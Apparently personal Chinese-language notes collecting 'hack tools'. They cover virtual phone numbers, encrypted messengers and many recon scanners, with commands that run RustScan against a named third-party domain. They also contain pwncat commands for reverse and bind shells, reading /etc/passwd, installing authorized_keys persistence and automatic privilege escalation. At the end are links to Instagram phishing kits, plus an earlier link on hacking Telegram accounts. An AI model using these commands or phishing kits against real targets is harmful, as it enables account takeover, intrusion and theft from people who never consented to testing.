# hack tools

虚拟号码：
TextNow
  不能用signal

[google voice](https://voice.google.com/) 虚拟手机号
  一定要用美国vpn
  + 环聊
  + 长时间不用，会回收
  + 可以上signal
  + 需要美国手机，所以考虑直接淘宝购买
  + 收到后登录 https://myaccount.google.com/language 改语言
  + 左上角->旧版->setting->phones->Transfer,注意要用美国的ip
  + 自动保号：
    + https://ifttt.com/
    + keep google voice active
Google voice免费美国电话号码获取、转移、全自动保号教程
https://www.youtube.com/watch?v=8j3_rbES5Hs
https://exploityte.medium.com/how-to-hack-telegram-account-2020-exploitbyte-3e533be4d606

textplus
nextplus
  两个都不能收 telegram signal

textfree
textme
talkatone

## 加密聊天

viber
silence
  不需要注册登录
  不需要网络
  免费开源
  密码锁定
element
  免费开源
  不用手机号
[matrix](https://matrix.org/docs/projects/bridge/mautrix-telegram)
telegram
  

signal
https://signal.org/download/
  https://signal.org/android/apk/
漏洞收购平台 zerodium

Burp Suite :-https://portswigger.net/burp
ZAP Proxy :-https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project
Knockpy:-https://github.com/nahamsec/HostileSubBruteforcer
HostileSubBruteforcer:-https://github.com/aboul3la/Sublist3r
Sublist3r:-https://github.com/aboul3la/Sublist3r
crt.sh:-https://crt.sh
IPV4info.com :-http://ipv4info.com
SecLists:-https://github.com/danielmiessler/SecLists
xss hunter:-https://xsshunter.com
sqlmap:-http://sqlmap.org 
Nmap 
Eyewitness 
Shodan 
Censys
 What CMS 
BuiltWith 
Nikto 
Recon-ng 
GitRob 
CyberChef 
OnlineHashCrack.com 
idb 
Wireshark 
Bucket Finder 
Race the Web 
Google Dorks 
JD GUI 
Mobile Security Framework Ysoserial 
Firefox Plugins 
FoxyProxy 
User Agent Switcher 
Firebug 
Hackbar 
Websecurify 
Cookie Manager+ CONTENTS XSS Me 
OffsecExploit-db Search 
Wappalyzer

hacking tool
CMSmap Crips Devploit doork evilUrl
gitGraber gitleaks httpprobe infoga LFIsuite
ReconDong Red_WAWK relative-url-extractor Rupert
 Sqlmate subbrute sublist3r 

https://github.com/Tib3rius/AutoRecon
https://github.com/21y4d/nmapAutomator

### [truffleHog](https://github.com/dxa4481/truffleHog)
对一个库的commit 进行搜索

pip3 install truffleHog
truffleHog --regex --entropy=False https://github.com/dxa4481/truffleHog.git 

duckduckgo: crypto.com github
https://github.com/crypto-com
找一个库下来测试一下

狗爹的 tartufo
https://github.com/godaddy/tartufo
https://ddeevv.com/lib/pypi/gd-trufflehog.html

### [SecLists](https://gitee.com/azhao-1981/SecLists)
https://github.com/danielmiessler/SecLists

https://robertscocca.medium.com/upgrade-your-common-hacking-tools-45ba700d42bb

###　[Updog](https://github.com/sc0tfree/updog)

开一个临时的上传下载http服务

其实kali 所有东西最好都用sudo su玩，因为以前他就是直接用root,直到后来别人用kali做为主力系统，为安全才改成有一个kali用户

```bash
sudo su
pip3 install updog
```



### [Rustcan](https://github.com/RustScan/RustScan)
Nmap vs rustmap
下载 https://github.com/RustScan/RustScan/releases
apt install xxx.deb

使用：
sudo su
ulimit -n 65535
rustscan -t 1500  -a caf.gezhishirt.club -- -A -sC

### [Feroxbuster](https://github.com/epi052/feroxbuster)
Gobuster vs feroxbuster

```bash
# kali
sudo apt update && sudo apt install -y feroxbuster
feroxbuster --url https://xxxx.com -w Discovery/web-conent/common.txt --depth 2
```

https://github.com/danielmiessler/SecLists
https://tools.kali.org/password-attacks/seclists
https://github.com/epi052/feroxbuster

TODO
https://santosomar.medium.com/a-quick-demo-of-feroxbuster-with-burp-suite-ea1386995155

[How to install and use Feroxbuster in Linux](https://www.youtube.com/watch?v=x5qAc-Gc4f4&t=302s)


###　[Pwncat](https://github.com/calebstewart/pwncat)

netcat　vs pwncat 

注意要用pip3
pip3 install git+https://github.com/calebstewart/pwncat.git
会出错,如果用pip(pip2)也会出错，不认git+https://
git clone https://github.com/calebstewart/pwncat.git
pip3 install -r requirements.txt
ok

https://www.youtube.com/watch?v=CISzI9klRkw&t=167s

```bash
# connet to remote bind Shell
pwncat --connet -H 127.0.0.1 -p 4444
# connet via ssh w/ know credentials
pwncat --ssh -i id_rsa -u user -H 127.0.0.1 
# listen for a reverse Shell
pwncat --listen -p 4444
# Reconnect to a host via installed persistence
pwncat --reconnect -H 127.0.0.1 

# local 
upload xxx /tmp/xxx
download /etc/passwd ./passwd

# persist
## 在远程机器上persist
persist --install -m authorized_keys
##　查看目标机器的persist方法
persist --status
## 删除
persist --clean

# 查看目标主机变化
tamper
# 恢复原来状态
tamper --ervert --all

# 上传busybox
busybox --install

# 自动枚举目标主机上不安全命令
enum --show --type sudo 
# 写成报告
enum --report xx.md

# 查看提权
privesc -l
# 自动提权
privesc -e -u sysadmin
```

https://robertscocca.medium.com/how-to-build-a-hacking-vps-44159f1eb55c

## beef github

https://github.com/beefproject/beef

## google: instagram phishing script 2021

https://www.imagediamond.com/blog/hack-instagram-account/
https://github.com/ExilasP/InstaPhisher
https://www.thegadgetox.net/how-to-hack-instagram-account-working-methods/
https://github.com/codersamet/Instagram-Phishing
https://github.com/topics/instagram-phishing
